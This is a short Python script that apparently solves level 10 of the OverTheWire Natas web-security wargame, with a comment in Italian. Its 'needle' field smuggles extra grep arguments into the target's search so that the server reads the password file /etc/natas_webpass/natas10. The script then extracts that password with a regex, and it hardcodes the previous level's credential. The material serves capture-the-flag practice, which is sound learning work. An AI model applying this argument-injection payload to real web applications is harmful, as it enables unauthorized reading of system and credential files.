#!/bin/python3
# Come il livello precedente ma questa volta alcuni caratteri erano vietati
import requests
import re

user = 'natas10'
password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'

url = 'http://%s.natas.labs.overthewire.org/' % user
obj = {'needle': '-m 2 \'.*\' /etc/natas_webpass/natas10', 'submit': 'submit'}

post = requests.post(url, data=obj, auth=(user, password))

print(post.text)

sol = re.findall('/etc/natas_webpass/natas10:(.*)', post.text)
print('Password')
print(sol[0])
